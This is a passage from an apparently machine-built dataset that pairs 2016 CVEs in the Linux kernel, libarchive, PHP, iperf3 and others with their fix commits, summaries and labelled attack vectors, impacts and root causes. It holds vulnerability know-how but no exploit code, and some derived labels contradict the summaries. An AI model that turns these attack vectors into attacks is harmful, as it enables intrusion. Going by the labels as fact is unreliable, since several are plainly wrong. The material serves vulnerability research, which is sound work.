trigger, but this is dependent on the system.  Note also that\nthe name of the keyring created contains a random number that may be\nbetween 1 and 10 characters in size, so may throw the test off by\nchanging the amount of quota used.\n\nAssuming the failure occurs, something like the following will be seen:\n\n\tkfree_debugcheck: out of range ptr 6b6b6b6b6b6b6b68h\n\t------------[ cut here ]------------\n\tkernel BUG at ..\/mm\/slab.c:2821!\n\t...\n\tRIP: 0010:[<ffffffff811600f9>] kfree_debugcheck+0x20\/0x25\n\tRSP: 0018:ffff8804014a7de8  EFLAGS: 00010092\n\tRAX: 0000000000000034 RBX: 6b6b6b6b6b6b6b68 RCX: 0000000000000000\n\tRDX: 0000000000040001 RSI: 00000000000000f6 RDI: 0000000000000300\n\tRBP: ffff8804014a7df0 R08: 0000000000000001 R09: 0000000000000000\n\tR10: ffff8804014a7e68 R11: 0000000000000054 R12: 0000000000000202\n\tR13: ffffffff81318a66 R14: 0000000000000000 R15: 0000000000000001\n\t...\n\tCall Trace:\n\t  kfree+0xde\/0x1bc\n\t  assoc_array_cancel_edit+0x1f\/0x36\n\t  __key_link_end+0x55\/0x63\n\t  key_reject_and_link+0x124\/0x155\n\t  keyctl_reject_key+0xb6\/0xe0\n\t  keyctl_negate_key+0x10\/0x12\n\t  SyS_keyctl+0x9f\/0xe7\n\t  do_syscall_64+0x63\/0x13a\n\t  entry_SYSCALL64_slow_path+0x25\/0x25\n\nFixes: f70e2e06196a ('KEYS: Do preallocation for __key_link()')\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nSigned-off-by: David Howells <dhowells@redhat.com>\ncc: stable@vger.kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The key_reject_and_link function in security\/keys\/key.c in the Linux kernel through 4.6.3 does not ensure that a certain data structure is initialized, which allows local users to cause a denial of service (system crash) via vectors involving a crafted keyctl request2 command.","commit_message_1":"potential uninitialized variable if __key_link_begin ( ) failed then `` edit '' would be uninitialized","Vulnerability Type":"system crash","Attack Vector":"via vectors involving a crafted keyctl request2 command ","Impact":"cause a denial of service ( system crash )","Root Cause":"does not ensure that a certain data structure is initialized ","Attack Type":"local attacker"},{"commit_id":"3ce424e45411cf5a13105e0386b6ecf6eeb4f66f","cve_id":"CVE-2016-4440","cwe_id":"CWE-264","commit_message":"kvm:vmx: more complete state update on APICv on\/off\n\nThe function to update APICv on\/off state (in particular, to deactivate\nit when enabling Hyper-V SynIC) is incomplete: it doesn't adjust\nAPICv-related fields among secondary processor-based VM-execution\ncontrols.  As a result, Windows 2012 guests get stuck when SynIC-based\nauto-EOI interrupt intersected with e.g. an IPI in the guest.\n\nIn addition, the MSR intercept bitmap isn't updated every time \"virtualize\nx2APIC mode\" is toggled.  This path can only be triggered by a malicious\nguest, because Windows didn't use x2APIC but rather their own synthetic\nAPIC access MSRs; however a guest running in a SynIC-enabled VM could\nswitch to x2APIC and thus obtain direct access to host APIC MSRs\n(CVE-2016-4440).\n\nThe patch fixes those omissions.\n\nSigned-off-by: Roman Kagan <rkagan@virtuozzo.com>\nReported-by: Steve Rutherford <srutherford@google.com>\nReported-by: Yang Zhang <yang.zhang.wz@gmail.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"arch\/x86\/kvm\/vmx.c in the Linux kernel through 4.6.3 mishandles the APICv on\/off state, which allows guest OS users to obtain direct APIC MSR access on the host OS, and consequently cause a denial of service (host OS crash) or possibly execute arbitrary code on the host OS, via x2APIC mode.","commit_message_1":"more complete state update on apicv on\/off the function to update apicv on\/off state ( in particular , to deactivate it when enabling hyper-v synic ) is incomplete : it doe n't adjust apicv-related field among secondary processor-based vm-execution control","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via x2apic mode","Impact":"obtain direct apic msr access on the host os , and consequently cause a denial of service ( host os crash ) or possibly execute arbitrary code on the host os ,","Root Cause":"caused by an APIC register access issue","Attack Type":"remote attacker"},{"commit_id":"e678873","cve_id":"CVE-2016-4414","cwe_id":null,"commit_message":"Handle invalid handshake data properly in the core\n\nClients sending invalid handshake data could make the core crash\ndue to an unchecked pointer. This commit fixes this issue by having\nthe core close the socket if a peer could not be created.\n\nThanks to Bas Pape (Tucos) for finding this one!","summary":"The onReadyRead function in core\/coreauthhandler.cpp in Quassel before 0.12.4 allows remote attackers to cause a denial of service (NULL pointer dereference and crash) via invalid handshake data.","commit_message_1":"handle invalid handshake data properly in the core client sending invalid handshake data could make the core crash due to an unchecked pointer","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via invalid handshake data","Impact":"cause a denial of service ( pointer dereference and crash )","Root Cause":"caused by the failure to take into account the lack of a match by the protocol negotiation","Attack Type":"remote attacker"},{"commit_id":"91f2fa59e8ed80dfbf400add0164ee0e508e412a","cve_id":"CVE-2016-4303","cwe_id":"CWE-119","commit_message":"Fix a buffer overflow \/ heap corruption issue that could occur if a\nmalformed JSON string was passed on the control channel.  This issue,\npresent in the cJSON library, was already fixed upstream, so was\naddressed here in iperf3 by importing a newer version of cJSON (plus\nlocal ESnet modifications).\n\nDiscovered and reported by Dave McDaniel, Cisco Talos.\n\nBased on a patch by @dopheide-esnet, with input from @DaveGamble.\n\nCross-references:  TALOS-CAN-0164, ESNET-SECADV-2016-0001,\nCVE-2016-4303\n\n(cherry picked from commit ed94082be27d971a5e1b08b666e2c217cf470a40)\nSigned-off-by: Bruce A. Mah <bmah@es.net>","summary":"The parse_string function in cjson.c in the cJSON library mishandles UTF8\/16 strings, which allows remote attackers to cause a denial of service (crash) or execute arbitrary code via a non-hex character in a JSON string, which triggers a heap-based buffer overflow.","commit_message_1":"fix a buffer overflow \/ heap corruption issue that could occur if a malformed json string wa passed on the control channel","Vulnerability Type":"buffer overflow","Attack Vector":"via a non - hex character in a json string , which triggers a heap - based buffer overflow","Impact":"cause a denial of service ( crash ) or execute arbitrary code","Root Cause":"caused by improper bounds checking by the JSON handling functionality","Attack Type":"remote attacker"},{"commit_id":"05caadc7eedbef471ac9610809ba683f0c698700","cve_id":"CVE-2016-4302","cwe_id":"CWE-119","commit_message":"Issue 719:  Fix for TALOS-CAN-154\n\nA RAR file with an invalid zero dictionary size was not being\nrejected, leading to a zero-sized allocation for the dictionary\nstorage which was then overwritten during the dictionary initialization.\n\nThanks to the Open Source and Threat Intelligence project at Cisco for\nreporting this.","summary":"Heap-based buffer overflow in the parse_codes function in archive_read_support_format_rar.c in libarchive before 3.2.1 allows remote attackers to execute arbitrary code via a RAR file with a zero-sized dictionary.","commit_message_1":"fix for talos-can-<number> a rar file with an invalid zero dictionary size wa not being rejected , leading to a zero-sized allocation for the dictionary storage which wa then overwritten during the dictionary initialization","Vulnerability Type":"buffer overflow","Attack Vector":"via a rar file with a zero - sized dictionary","Impact":"execute arbitrary code","Root Cause":"caused by a heap overflow","Attack Type":"remote attacker"},{"commit_id":"a550daeecf6bc689ade371349892ea17b5b97c77","cve_id":"CVE-2016-4301","cwe_id":"CWE-119","commit_message":"Fix libarchive\/archive_read_support_format_mtree.c:1388:11: error: array subscript is above array bounds","summary":"Stack-based buffer overflow in the parse_device function in archive_read_support_format_mtree.c in libarchive before 3.2.1 allows remote attackers to execute arbitrary code via a crafted mtree file.","commit_message_1":"fix libarchive\/<file> : <number> : <number> : error : array subscript is above array bound","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted mtree file","Impact":"execute arbitrary code","Root Cause":"caused by improper bounds checking by the mtree parse_device","Attack Type":"remote attacker"},{"commit_id":"e79ef306afe332faf22e9b442a2c6b59cb175573","cve_id":"CVE-2016-4300","cwe_id":"CWE-190","commit_message":"Issue #718: Fix TALOS-CAN-152\n\nIf a 7-Zip archive declares a rediculously large number of substreams,\nit can overflow an internal counter, leading a subsequent memory\nallocation to be too small for the substream data.\n\nThanks to the Open Source and Threat Intelligence project at Cisco\nfor reporting this issue.","summary":"Integer overflow in the read_SubStreamsInfo function in archive_read_support_format_7zip.c in libarchive before 3.2.1 allows remote attackers to execute arbitrary code via a 7zip file with a large number of substreams, which triggers a heap-based buffer overflow.","commit_message_1":"fix talos-can-<number> if a <number>-zip archive declares a rediculously large number of substreams , it can overflow an internal counter , leading a subsequent memory allocation to be too small for the substream data","Vulnerability Type":"integer overflow","Attack Vector":"via a 7zip file with a large number of substreams , which triggers a heap - based buffer overflow","Impact":"execute arbitrary code","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"b348d7dddb6c4fbfc810b7a0626e8ec9e29f7cbb","cve_id":"CVE-2016-3955","cwe_id":"CWE-119","commit_message":"USB: usbip: fix potential out-of-bounds write\n\nFix potential out-of-bounds write to urb->transfer_buffer\nusbip handles network communication directly in the kernel. When receiving a\npacket from its peer, usbip code parses headers according to protocol. As\npart of this parsing urb->actual_length is filled. Since the input for\nurb->actual_length comes from the network, it should be treated as untrusted.\nAny entity controlling the network may put any value in the input and the\npreallocated urb->transfer_buffer may not be large enough to hold the data.\nThus, the malicious entity is able to write arbitrary data to kernel memory.\n\nSigned-off-by: Ignat Korchagin <ignat.korchagin@gmail.com>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The usbip_recv_xbuff function in drivers\/usb\/usbip\/usbip_common.c in the Linux kernel before 4.5.3 allows remote attackers to cause a denial of service (out-of-bounds write) or possibly have unspecified other impact via a crafted length value in a USB\/IP packet.","commit_message_1":"usbip : fix potential out-of-bounds write fix potential out-of-bounds write to urb- > transfer_buffer usbip handle network communication directly in the kernel","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted length value in a usb \/ ip packet","Impact":"cause a denial of service ( out - of - bounds write ) or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds write error","Attack Type":"remote attacker"},{"commit_id":"4d06dd537f95683aba3651098ae288b7cbff8274","cve_id":"CVE-2016-3951","cwe_id":null,"commit_message":"cdc_ncm: do not call usbnet_link_change from cdc_ncm_bind\n\nusbnet_link_change will call schedule_work and should be\navoided if bind is failing. Otherwise we will end up with\nscheduled work referring to a netdev which has gone away.\n\nInstead of making the call conditional, we can just defer\nit to usbnet_probe, using the driver_info flag made for\nthis purpose.\n\nFixes: 8a34b0ae8778 (\"usbnet: cdc_ncm: apply usbnet_link_change\")\nReported-by: Andrey Konovalov <andreyknvl@gmail.com>\nSuggested-by: Linus Torvalds <torvalds@linux-foundation.org>\nSigned-off-by: Bj\u00f8rn Mork <bjorn@mork.no>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Double free vulnerability in drivers\/net\/usb\/cdc_ncm.c in the Linux kernel before 4.5 allows physically proximate attackers to cause a denial of service (system crash) or possibly have unspecified other impact by inserting a USB device with an invalid USB descriptor.","commit_message_1":"do not call usbnet_link_change from cdc_ncm_bind usbnet_link_change will call schedule_work and should be avoided if bind is failing","Vulnerability Type":"double free","Attack Vector":"by inserting a usb device with an invalid usb descriptor","Impact":"cause a denial of service ( system crash ) or possibly have unspecified other impact","Root Cause":"caused by a double-free error","Attack Type":"local attacker"},{"commit_id":"45f6fad84cc305103b28d73482b344d7f5b76f39","cve_id":"CVE-2016-3841","cwe_id":"CWE-416","commit_message":"ipv6: add complete rcu protection around np->opt\n\nThis patch addresses multiple problems :\n\nUDP\/RAW sendmsg() need to get a stable struct ipv6_txoptions\nwhile socket is not locked : Other threads can change np->opt\nconcurrently. Dmitry posted a syzkaller\n(http:\/\/github.com\/google\/syzkaller) program desmonstrating\nuse-after-free.\n\nStarting with TCP\/DCCP lockless listeners, tcp_v6_syn_recv_sock()\nand dccp_v6_request_recv_sock() also need to use RCU protection\nto dereference np->opt once (before calling ipv6_dup_options())\n\nThis patch adds full RCU protection to np->opt\n\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nAcked-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The IPv6 stack in the Linux kernel before 4.3.3 mishandles options data, which allows local users to gain privileges or cause a denial of service (use-after-free and system crash) via a crafted sendmsg system call.","commit_message_1":"add complete rcu protection around np- > opt this patch address multiple problem : udp\/raw sendmsg ( ) need to get a stable struct ipv6_txoptions while socket is not locked : other thread can change np- > opt concurrently","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted sendmsg system call ","Impact":"gain privileges or cause a denial of service ( use - after - free and system crash )","Root Cause":"caused by a use-after-free error","Attack Type":"local attacker"},{"commit_id":"9842df62004f366b9fed2423e24df10542ee0dc5","cve_id":"CVE-2016-3713","cwe_id":"CWE-284","commit_message":"KVM: MTRR: remove MSR 0x2f8\n\nMSR 0x2f8 accessed the 124th Variable Range MTRR ever since MTRR support\nwas introduced by 9ba075a664df (\"KVM: MTRR support\").\n\n0x2f8 became harmful when 910a6aae4e2e (\"KVM: MTRR: exactly define the\nsize of variable MTRRs\") shrinked the array of VR MTRRs from 256 to 8,\nwhich made access to index 124 out of bounds.  The surrounding code only\nWARNs in this situation, thus the guest gained a limited read\/write\naccess to struct kvm_arch_vcpu.\n\n0x2f8 is not a valid VR MTRR MSR, because KVM has\/advertises only 16 VR\nMTRR MSRs, 0x200-0x20f.  Every VR MTRR is set up using two MSRs, 0x2f8\nwas treated as a PHYSBASE and 0x2f9 would be its PHYSMASK, but 0x2f9 was\nnot implemented in KVM, therefore 0x2f8 could never do anything useful\nand getting rid of it is safe.\n\nThis fixes CVE-2016-3713.\n\nFixes: 910a6aae4e2e (\"KVM: MTRR: exactly define the size of variable MTRRs\")\nCc: stable@vger.kernel.org\nReported-by: David Matlack <dmatlack@google.com>\nSigned-off-by: Andy Honig <ahonig@google.com>\nSigned-off-by: Radim Kr\u010dm\u00e1\u0159 <rkrcmar@redhat.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"The msr_mtrr_valid function in arch\/x86\/kvm\/mtrr.c in the Linux kernel before 4.6.1 supports MSR 0x2f8, which allows guest OS users to read or write to the kvm_arch_vcpu data structure, and consequently obtain sensitive information or cause a denial of service (system crash), via a crafted ioctl call.","commit_message_1":"mtrr : remove msr 0x2f8 msr 0x2f8 accessed the 124th variable range mtrr ever since mtrr support wa introduced by 9ba075a664df ( `` kvm : mtrr support '' )","Vulnerability Type":"Improper Access Control","Attack Vector":"via a crafted ioctl call","Impact":"cause a denial of service","Root Cause":"caused by an out-of-bounds r\/w access issue","Attack Type":"attacker"},{"commit_id":"a4a5ed2835e8ea042868b7401dced3f517cafa76","cve_id":"CVE-2016-3699","cwe_id":"CWE-264","commit_message":"acpi: Disable ACPI table override if securelevel is set\n\nFrom the kernel documentation (initrd_table_override.txt):\n\n  If the ACPI_INITRD_TABLE_OVERRIDE compile option is true, it is possible\n  to override nearly any ACPI table provided by the BIOS with an\n  instrumented, modified one.\n\nWhen securelevel is set, the kernel should disallow any unauthenticated\nchanges to kernel space. ACPI tables contain code invoked by the kernel, so\ndo not allow ACPI tables to be overridden if securelevel is set.\n\nSigned-off-by: Linn Crosetto <linn@hpe.com>","summary":"The Linux kernel, as used in Red Hat Enterprise Linux 7.2 and Red Hat Enterprise MRG 2 and when booted with UEFI Secure Boot enabled, allows local users to bypass intended Secure Boot restrictions and execute untrusted code by appending ACPI tables to the initrd.","commit_message_1":"disable acpi table override if securelevel is set from the kernel documentation ( <file> ) : if the acpi_initrd_table_override compile option is true , it is possible to override nearly any acpi table provided by the bios with an instrumented , modified one","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"by appending acpi tables to the initrd","Impact":"bypass intended secure boot restrictions and execute untrusted code","Root Cause":"when booted with UEFI Secure Boot enabled","Attack Type":"local attacker"},{"commit_id":"a4892df306e0532487f1634ba6d4c6d4bb381c7f","cve_id":"CVE-2016-3698","cwe_id":"CWE-284","commit_message":"libndp: validate the IPv6 hop limit\n\nNone of the NDP messages should ever come from a non-local network; as\nstated in RFC4861's 6.1.1 (RS), 6.1.2 (RA), 7.1.1 (NS), 7.1.2 (NA),\nand 8.1. (redirect):\n\n  - The IP Hop Limit field has a value of 255, i.e., the packet\n    could not possibly have been forwarded by a router.\n\nThis fixes CVE-2016-3698.\n\nReported by: Julien BERNARD <julien.bernard@viagenie.ca>\nSigned-off-by: Lubomir Rintel <lkundrak@v3.sk>\nSigned-off-by: Jiri Pirko <jiri@mellanox.com>","summary":"libndp before 1.6, as used in NetworkManager, does not properly validate the origin of Neighbor Discovery Protocol (NDP) messages, which allows remote attackers to conduct man-in-the-middle attacks or cause a denial of service (network connectivity disruption) by advertising a node as a router from a non-local network.","commit_message_1":"validate the ipv6 hop limit none of the ndp message should ever come from a non-local network ; a stated in rfc4861 's <file>","Vulnerability Type":"Improper Access Control","Attack Vector":"by advertising a node as a router from a non - local network","Impact":"cause a denial of service","Root Cause":"does not properly validate the origin of neighbor discovery protocol ( ndp ) messages","Attack Type":"remote attacker"},{"commit_id":"a0ad220c96692eda76b2e3fd7279f3dcd1d8a8ff","cve_id":"CVE-2016-3689","cwe_id":null,"commit_message":"Input: ims-pcu - sanity check against missing interfaces\n\nA malicious device missing interface can make the driver oops.\nAdd sanity checking.\n\nSigned-off-by: Oliver Neukum <ONeukum@suse.com>\nCC: stable@vger.kernel.org\nSigned-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>","summary":"The ims_pcu_parse_cdc_data function in drivers\/input\/misc\/ims-pcu.c in the Linux kernel before 4.5.1 allows physically proximate attackers to cause a denial of service (system crash) via a USB device without both a master and a slave interface.","commit_message_1":"ims-pcu - sanity check against missing interface a malicious device missing interface can make the driver oops","Vulnerability Type":"system crash","Attack Vector":"via a usb device without both a master and a slave interface","Impact":"cause a denial of service ( system crash )","Root Cause":"caused by an error related to a device pretending to a genuine device","Attack Type":"local attacker"},{"commit_id":"8b8addf891de8a00e4d39fc32f93f7c5eb8feceb","cve_id":"CVE-2016-3672","cwe_id":"CWE-254","commit_message":"x86\/mm\/32: Enable full randomization on i386 and X86_32\n\nCurrently on i386 and on X86_64 when emulating X86_32 in legacy mode, only\nthe stack and the executable are randomized but not other mmapped files\n(libraries, vDSO, etc.). This patch enables randomization for the\nlibraries, vDSO and mmap requests on i386 and in X86_32 in legacy mode.\n\nBy default on i386 there are 8 bits for the randomization of the libraries,\nvDSO and mmaps which only uses 1MB of VA.\n\nThis patch preserves the original randomness, using 1MB of VA out of 3GB or\n4GB. We think that 1MB out of 3GB is not a big cost for having the ASLR.\n\nThe first obvious security benefit is that all objects are randomized (not\nonly the stack and the executable) in legacy mode which highly increases\nthe ASLR effectiveness, otherwise the attackers may use these\nnon-randomized areas. But also sensitive setuid\/setgid applications are\nmore secure because currently, attackers can disable the randomization of\nthese applications by setting the ulimit stack to \"unlimited\". This is a\nvery old and widely known trick to disable the ASLR in i386 which has been\nallowed for too long.\n\nAnother trick used to disable the ASLR was to set the ADDR_NO_RANDOMIZE\npersonality flag, but fortunately this doesn't work on setuid\/setgid\napplications because there is security checks which clear Security-relevant\nflags.\n\nThis patch always randomizes the mmap_legacy_base address, removing the\npossibility to disable the ASLR by setting the stack to \"unlimited\".\n\nSigned-off-by: Hector Marco-Gisbert <hecmargi@upv.es>\nAcked-by: Ismael Ripoll Ripoll <iripoll@upv.es>\nAcked-by: Kees Cook <keescook@chromium.org>\nAcked-by: Arjan van de Ven <arjan@linux.intel.com>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nCc: Peter Zijlstra <peterz@infradead.org>\nCc: Thomas Gleixner <tglx@linutronix.de>\nCc: akpm@linux-foundation.org\nCc: kees Cook <keescook@chromium.org>\nLink: http:\/\/lkml.kernel.org\/r\/1457639460-5242-1-git-send-email-hecmargi@upv.es\nSigned-off-by: Ingo Molnar <mingo@kernel.org>","summary":"The arch_pick_mmap_layout function in arch\/x86\/mm\/mmap.c in the Linux kernel through 4.5.2 does not properly randomize the legacy base address, which makes it easier for local users to defeat the intended restrictions on the ADDR_NO_RANDOMIZE flag, and bypass the ASLR protection mechanism for a setuid or setgid program, by disabling stack-consumption resource limits.","commit_message_1":"enable full randomization on i386 and x86_32 currently on i386 and on x86_64 when emulating x86_32 in legacy mode , only the stack and the executable are randomized but not other mmapped file ( library , vdso , etc","Vulnerability Type":"Security Features","Attack Vector":"by disabling stack - consumption resource limits","Impact":"defeat the intended restrictions on the addr _ no _ randomize flag , and bypass the aslr protection mechanism for a setuid or setgid program ","Root Cause":"does not properly randomize the legacy base address","Attack Type":"local attacker"},{"commit_id":"fbd40ea0180a2d328c5adc61414dc8bab9335ce2","cve_id":"CVE-2016-3156","cwe_id":"CWE-399","commit_message":"ipv4: Don't do expensive useless work during inetdev destroy.\n\nWhen an inetdev is destroyed, every address assigned to the interface\nis removed.  And in this scenerio we do two pointless things which can\nbe very expensive if the number of assigned interfaces is large:\n\n1) Address promotion.  We are deleting all addresses, so there is no\n   point in doing this.\n\n2) A full nf conntrack table purge for every address.  We only need to\n   do this once, as is already caught by the existing\n   masq_dev_notifier so masq_inet_event() can skip this.\n\nReported-by: Solar Designer <solar@openwall.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\nTested-by: Cyrill Gorcunov <gorcunov@openvz.org>","summary":"The IPv4 implementation in the Linux kernel before 4.5.2 mishandles destruction of device objects, which allows guest OS users to cause a denial of service (host OS networking outage) by arranging for a large number of IP addresses.","commit_message_1":"do n't do expensive useless work during inetdev destroy","Vulnerability Type":"Resource Management Errors","Attack Vector":"by arranging for a large number of ip addresses","Impact":"cause a denial of service ( host os networking outage )","Root Cause":"caused by an error when destroying a network","Attack Type":"local attacker"},{"commit_id":"5a07975ad0a36708c6b0a5b9fea1ff811d0b0c1f","cve_id":"CVE-2016-3140","cwe_id":null,"commit_message":"USB: digi_acceleport: do sanity checking for the number of ports\n\nThe driver can be crashed with devices that expose crafted descriptors\nwith too few endpoints.\n\nSee: http:\/\/seclists.org\/bugtraq\/2016\/Mar\/61\n\nSigned-off-by: Oliver Neukum <ONeukum@suse.com>\n[johan: fix OOB endpoint check and add error messages ]\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Johan Hovold <johan@kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The digi_port_init function in drivers\/usb\/serial\/digi_acceleport.c in the Linux kernel before 4.5.1 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and system crash) via a crafted endpoints value in a USB device descriptor.","commit_message_1":"digi_acceleport : do sanity checking for the number of port the driver can be crashed with device that expose crafted descriptor with too few endpoint","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via a crafted endpoints value in a usb device descriptor","Impact":"cause a denial of service ( pointer dereference and system crash )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"8835ba4a39cf53f705417b3b3a94eb067673f2c9","cve_id":"CVE-2016-3138","cwe_id":null,"commit_message":"USB: cdc-acm: more sanity checking\n\nAn attack has become available which pretends to be a quirky\ndevice circumventing normal sanity checks and crashes the kernel\nby an insufficient number of interfaces. This patch adds a check\nto the code path for quirky devices.\n\nSigned-off-by: Oliver Neukum <ONeukum@suse.com>\nCC: stable@vger.kernel.org\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The acm_probe function in drivers\/usb\/class\/cdc-acm.c in the Linux kernel before 4.5.1 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and system crash) via a USB device without both a control and a data endpoint descriptor.","commit_message_1":"cdc-acm : more sanity checking an attack ha become available which pretend to be a quirky device circumventing normal sanity check and crash the kernel by an insufficient number of interface","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via a usb device without both a control and a data endpoint descriptor","Impact":"cause a denial of service ( pointer dereference and system crash )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"c55aee1bf0e6b6feec8b2927b43f7a09a6d5f754","cve_id":"CVE-2016-3137","cwe_id":null,"commit_message":"USB: cypress_m8: add endpoint sanity check\n\nAn attack using missing endpoints exists.\n\nCVE-2016-3137\n\nSigned-off-by: Oliver Neukum <ONeukum@suse.com>\nCC: stable@vger.kernel.org\nSigned-off-by: Johan Hovold <johan@kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"drivers\/usb\/serial\/cypress_m8.c in the Linux kernel before 4.5.1 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and system crash) via a USB device without both an interrupt-in and an interrupt-out endpoint descriptor, related to the cypress_generic_port_probe and cypress_open functions.","commit_message_1":"cypress_m8 : add endpoint sanity check an attack using missing endpoint exists","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via a usb device without both an interrupt - in and an interrupt - out endpoint descriptor , related to the cypress _ generic _ port _ probe and cypress _ open functions","Impact":"cause a denial of service ( pointer dereference and system crash )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"4e9a0b05257f29cf4b75f3209243ed71614d062e","cve_id":"CVE-2016-3136","cwe_id":null,"commit_message":"USB: mct_u232: add sanity checking in probe\n\nAn attack using the lack of sanity checking in probe is known. This\npatch checks for the existence of a second port.\n\nCVE-2016-3136\n\nSigned-off-by: Oliver Neukum <ONeukum@suse.com>\nCC: stable@vger.kernel.org\n[johan: add error message ]\nSigned-off-by: Johan Hovold <johan@kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The mct_u232_msr_to_state function in drivers\/usb\/serial\/mct_u232.c in the Linux kernel before 4.5.1 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and system crash) via a crafted USB device without two interrupt-in endpoint descriptors.","commit_message_1":"mct_u232 : add sanity checking in probe an attack using the lack of sanity checking in probe is known","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via a crafted usb device without two interrupt - in endpoint descriptors","Impact":"cause a denial of service ( pointer dereference and system crash )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"d157bd761585605b7882935ffb86286919f62ea1","cve_id":"CVE-2016-3135","cwe_id":"CWE-189","commit_message":"netfilter: x_tables: check for size overflow\n\nBen Hawkes says:\n integer overflow in xt_alloc_table_info, which on 32-bit systems can\n lead to small structure allocation and a copy_from_user based heap\n corruption.\n\nReported-by: Ben Hawkes <hawkes@google.com>\nSigned-off-by: Florian Westphal <fw@strlen.de>\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org>","summary":"Integer overflow in the xt_alloc_table_info function in net\/netfilter\/x_tables.c in the Linux kernel through 4.5.2 on 32-bit platforms allows local users to gain privileges or cause a denial of service (heap memory corruption) via an IPT_SO_SET_REPLACE setsockopt call.","commit_message_1":"x_tables : check for size overflow ben hawkes say : integer overflow in xt_alloc_table_info , which on <number>-bit system can lead to small structure allocation and a copy_from_user based heap corruption","Vulnerability Type":"integer overflow","Attack Vector":"via an ipt _ so _ set _ replace setsockopt call","Impact":"gain privileges or cause a denial of service ( heap memory corruption )","Root Cause":"caused by an integer overflow","Attack Type":"local attacker"},{"commit_id":"54d83fc74aa9ec72794373cb47432c5f7fb1a309","cve_id":"CVE-2016-3134","cwe_id":"CWE-119","commit_message":"netfilter: x_tables: fix unconditional helper\n\nBen Hawkes says:\n\n In the mark_source_chains function (net\/ipv4\/netfilter\/ip_tables.c) it\n is possible for a user-supplied ipt_entry structure to have a large\n next_offset field. This field is not bounds checked prior to writing a\n counter value at the supplied offset.\n\nProblem is that mark_source_chains should not have been called --\nthe rule doesn't have a next entry, so its supposed to return\nan absolute verdict of either ACCEPT or DROP.\n\nHowever, the function conditional() doesn't work as the name implies.\nIt only checks that the rule is using wildcard address matching.\n\nHowever, an unconditional rule must also not be using any matches\n(no -m args).\n\nThe underflow validator only checked the addresses, therefore\npassing the 'unconditional absolute verdict' test, while\nmark_source_chains also tested for presence of matches, and thus\nproceeeded to the next (not-existent) rule.\n\nUnify this so that all the callers have same idea of 'unconditional rule'.\n\nReported-by: Ben Hawkes <hawkes@google.com>\nSigned-off-by: Florian Westphal <fw@strlen.de>\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org>","summary":"The netfilter subsystem in the Linux kernel through 4.5.2 does not validate certain offset fields, which allows local users to gain privileges or cause a denial of service (heap memory corruption) via an IPT_SO_SET_REPLACE setsockopt call.","commit_message_1":"x_tables : fix unconditional helper ben hawkes say : in the mark_source_chains function ( net\/ipv4\/netfilter\/<file> ) it is possible for a user-supplied ipt_entry structure to have a large next_offset field","Vulnerability Type":"buffer overflow","Attack Vector":"via an ipt _ so _ set _ replace setsockopt call","Impact":"gain privileges or cause a denial of service ( heap memory corruption )","Root Cause":"does not validate certain offset fields","Attack Type":"local attacker"},{"commit_id":"28a6ed9f9a36b9c517e4a8a429baf4dd382fc5d5?w=1","cve_id":"CVE-2016-3132","cwe_id":"CWE-415","commit_message":"Fix bug #71735: Double-free in SplDoublyLinkedList::offsetSet","summary":"Double free vulnerability in the SplDoublyLinkedList::offsetSet function in ext\/spl\/spl_dllist.c in PHP 7.x before 7.0.6 allows remote attackers to execute arbitrary code via a crafted index.","commit_message_1":"fix bug # <number> : double-free in spldoublylinkedlist : :offsetset","Vulnerability Type":"double free","Attack Vector":"via a crafted index","Impact":"execute arbitrary code","Root Cause":"caused by double-free error","Attack Type":"remote attacker"},{"commit_id":"93b4a6306a0026cf1cc31ac4bd8a49ba5d034ba7","cve_id":"CVE-2016-3120","cwe_id":"CWE-476","commit_message":"Fix S4U2Self KDC crash when anon is restricted\n\nIn validate_as_request(), when enforcing restrict_anonymous_to_tgt,\nuse client.princ instead of request->client; the latter is NULL when\nvalidating S4U2Self requests.\n\nCVE-2016-3120:\n\nIn MIT krb5 1.9 and later, an authenticated attacker can cause krb5kdc\nto dereference a null pointer if the restrict_anonymous_to_tgt option\nis set to true, by making an S4U2Self request.\n\n  CVSSv2 Vector: 